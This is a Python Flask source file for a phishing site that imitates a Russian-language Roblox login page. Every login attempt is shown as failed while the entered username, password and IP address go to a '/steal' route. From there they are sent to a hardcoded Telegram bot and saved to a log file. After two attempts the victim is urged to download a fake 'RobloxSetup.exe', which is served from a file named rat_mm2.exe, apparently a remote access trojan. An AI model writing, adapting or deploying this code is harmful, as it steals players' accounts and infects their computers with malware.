from flask import Flask, request, send_file
import datetime
import requests
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Войти в Roblox</title>
        <style>
            body {
                background: #0a0a1a;
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-form {
                background: #14142a;
                padding: 30px;
                border-radius: 12px;
                width: 340px;
                color: white;
                text-align: center;
            }
            .login-form input {
                width: 100%;
                padding: 12px;
                margin: 8px 0;
                background: #0a0a1a;
                border: 1px solid #2a2a4a;
                border-radius: 8px;
                color: white;
                box-sizing: border-box;
            }
            .login-form button {
                width: 100%;
                padding: 12px;
                background: #00bfff;
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: bold;
                cursor: pointer;
            }
            .login-form button:hover {
                background: #009acd;
            }
            .download-btn {
                display: none;
                margin-top: 15px;
                padding: 12px;
                background: #00b894;
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: bold;
                cursor: pointer;
                width: 100%;
            }
            .download-btn:hover {
                background: #00a381;
            }
            .error-message {
                color: #ff6b6b;
                margin-top: 10px;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="login-form">
            <h1>Войти в Roblox</h1>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Имя пользователя" required>
                <input type="password" id="password" placeholder="Пароль" required>
                <button type="submit">Войти</button>
            </form>
            <div id="message" class="error-message"></div>
            <button class="download-btn" id="downloadBtn">⬇️ Скачать RobloxSetup.exe</button>
        </div>

        <script>
            let attempts = 0;

            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const username = document.getElementById('username').value.trim();
                const password = document.getElementById('password').value.trim();

                if (!username || !password) {
                    document.getElementById('message').innerText = 'Заполните все поля';
                    return;
                }

                try {
                    await fetch('/steal', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ login: username, pass: password })
                    });
                } catch {}

                attempts++;
                document.getElementById('message').innerText = 'Неверный логин или пароль. Попробуйте снова.';
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';

                if (attempts >= 2) {
                    document.getElementById('message').innerHTML = '⚠️ Обнаружена проблема с входом. Скачайте обновление Roblox.';
                    document.getElementById('downloadBtn').style.display = 'block';
                }
            });

            document.getElementById('downloadBtn').addEventListener('click', function() {
                window.location.href = '/download/roblox_setup.exe';
                this.innerText = '✅ Файл скачан! Запустите для входа.';
                this.disabled = true;
                this.style.background = '#00b894';
            });
        </script>
    </body>
    </html>
    '''

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    login = data.get('login')
    password = data.get('pass')
    ip = request.remote_addr

    msg = f"🎮 ROBLOX LOGIN!\n👤 {login}\n🔑 {password}\n🌐 IP: {ip}"
    send_tg(msg)

    with open('steals.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | {ip} | {login} | {password}\n")

    return {"status": "ok"}, 200

@app.route('/download/roblox_setup.exe')
def download_exe():
    try:
        return send_file('rat_mm2.exe', as_attachment=True, download_name='RobloxSetup.exe')
    except:
        return "Файл не найден. Загрузи rat_mm2.exe в корень репозитория.", 404

@app.route('/logs')
def logs():
    if not os.path.exists('steals.txt'):
        return "Нет логов"
    with open('steals.txt', 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
